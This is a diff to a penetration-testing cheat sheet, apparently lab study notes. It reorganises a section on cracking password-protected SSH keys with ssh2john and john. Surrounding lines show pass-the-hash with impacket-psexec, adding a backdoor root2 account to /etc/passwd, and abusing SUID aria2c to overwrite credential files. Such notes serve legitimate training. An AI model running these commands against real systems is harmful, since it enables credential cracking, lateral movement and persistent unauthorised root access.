@@ -2799,16 +2799,6 @@ sudo impacket-psexec itwk04admin@192.168.236.226 -hashes :445414c16b5689513d4ad8
 
 Obviously: Change the user, ip addresses and hash accordingly. Note that the colon before the hash is **required**
 
-Cracking id_rsa SSH: 
-
-First, convert the id_rsa into a ssh Hash: ssh2john id_rsa > ssh.hash
-
-Then, crack with john like this: john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
-
-Connect up like so: ssh -i id_rsa daniela@192.168.50.244
-
-Priv Esculation: Linpeas.sh
-
 Steganography: Sometimes hidden data is secreted in a file. We can inspect them using steghide.
 
 steghide extract -sf trytofind.jpg
@@ -3002,6 +2992,25 @@ cat id_rsa | base64 -d
 	2) Adding new root account to /etc/passwd (root:password)
  	root2:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash
 
+# Cracking Password-protected SSH Key With John
+
+Note: This only applies to password-protected SSH keys. They will look something like this:
+	-----BEGIN RSA PRIVATE KEY-----
+	Proc-Type: 4,ENCRYPTED
+	DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
+	...
+ 	-----END RSA PRIVATE KEY-----
+  
+Convert the id_rsa into a ssh Hash:
+	ssh2john id_rsa > ssh.hash
+
+Crack With John: 
+	john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+
+Connect up like so: ssh -i id_rsa daniela@192.168.50.244
+	Enter in the password found from john. id_rsa is required to be specified during connection
+
+ 
   # Aria2c
 
   Summary: Network Downloader tools with the SUID root bit set can be used to overwrite files, such as /etc/passwd or /root/.ssh/id_rsa
